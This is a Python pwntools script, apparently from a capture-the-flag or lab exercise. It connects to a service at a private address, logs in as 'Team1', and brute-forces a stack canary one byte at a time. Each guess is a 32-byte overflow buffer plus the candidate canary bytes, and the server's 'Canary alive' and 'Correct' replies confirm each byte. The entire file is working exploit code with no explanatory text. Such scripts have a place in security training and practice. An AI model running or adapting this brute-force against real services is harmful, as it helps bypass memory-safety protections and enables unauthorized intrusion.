from pwn import *
import re
import time
from pprint import pprint

target = remote("10.110.2.100", 5000)

pprint(target.recv())
target.sendline(b"Team1")
time.sleep(0.1)
pprint(target.recv())
target.sendline(b"2")
time.sleep(0.1)
pprint(target.recv())
count = 0
len = 33
canary = bytearray()
for i in range(1,12):
    count = 0
    if(i == 9):
        count=1
    while count <= 255:
        target.sendline(bytes(str(len), 'utf-8'))
        time.sleep(0.1)
        print(target.recv())
        buffer = b'a' *32
        buffer += bytes(canary) + count.to_bytes(1, 'big')
        print(list(bytes(canary) + count.to_bytes(1, 'big')))
        target.sendline(buffer)
        time.sleep(0.1)
        s= target.recv()
        #pprint(s)
        if b'Canary alive' in s:
            pprint(s)
            canary.append(count)
            print(canary)
            if b'Correct' in s:
                target.close()
                exit(1)
            break
        count += 1
    len+=1
target.close()
